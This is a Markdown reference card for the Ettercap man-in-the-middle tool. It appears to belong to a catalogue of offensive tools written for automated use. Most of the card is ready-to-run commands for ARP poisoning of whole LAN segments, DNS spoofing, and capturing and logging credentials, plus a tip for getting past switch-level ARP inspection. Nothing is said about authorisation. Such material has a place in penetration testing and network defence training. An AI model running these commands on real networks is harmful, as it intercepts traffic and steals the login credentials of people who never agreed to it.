# Ettercap

- **Category**: Sniffing & Spoofing / ARP Poisoning & MITM
- **Risk Level**: 🔴 High

---

## Description

A comprehensive man-in-the-middle (MITM) attack suite for LAN environments. Supports ARP poisoning, ICMP redirect, and DHCP spoofing to intercept traffic between hosts; automatically dissects and displays credentials from HTTP, FTP, Telnet, POP3, and other protocols. Use `-T` (text-only) mode for all automated and scripted use — the GUI mode requires X11.

## Installation

```bash
sudo apt install ettercap-text-only
```

## Parameter Reference

| Parameter | Description |
|-----------|-------------|
| `-T` | Use text only GUI |
| `-q` | Do not display packet contents |
| `-M <method>` | Perform a MITM attack |
| `-i <interface>` | Network interface |
| `-t <proto>` | Sniff only this proto (default is all) |
| `-P <plugin>` | Launch this plugin (multiple occurrence allowed) |
| `-F <filter>` | Load the filter file (content filter) |
| `-L <file>` | Log all the traffic to this logfile |
| `/<ip>/<port>/` | Target specification format: `MAC/IPs/PORTs` (use `//` for any) |
| `-D`, `--daemon` | Daemonize ettercap (run in background) |

## Common Commands

```bash
# ARP poison gateway + all hosts, capture credentials (text mode)
ettercap -T -q -M arp:remote /192.168.1.1// //

# MITM between two specific hosts only
ettercap -T -q -M arp:remote /192.168.1.1// /192.168.1.10//

# MITM with DNS spoofing (configure /etc/ettercap/etter.dns first)
ettercap -T -q -M arp:remote -P dns_spoof /192.168.1.1// //

# Specify interface
ettercap -T -q -i eth0 -M arp /192.168.1.1// /192.168.1.10//

# Log captured credentials to file
ettercap -T -q -M arp:remote -L creds.log /192.168.1.1// //

# List available plugins
ettercap -P list
```

## Notes & Tips

1. Always use `-T` (text mode) for automated/scripted use — the default GUI mode requires X11 and cannot run headlessly.
2. `arp:remote` enables bidirectional ARP poisoning — both the gateway and target forward traffic through the attacker.
3. Captured credentials are printed to the terminal automatically; redirect with `-L logfile` to persist them.
4. For DNS spoofing, add entries to `/etc/ettercap/etter.dns` before launching (format: `target.com A 192.168.1.100`).
5. On networks with dynamic ARP inspection (DAI) enabled on managed switches, ARP poisoning will be blocked — use `icmp` or `dhcp` MITM methods as alternatives.

---

## Official References

- [ettercap (GitHub)](https://github.com/Ettercap/ettercap)
- [Kali ettercap](https://www.kali.org/tools/ettercap/)
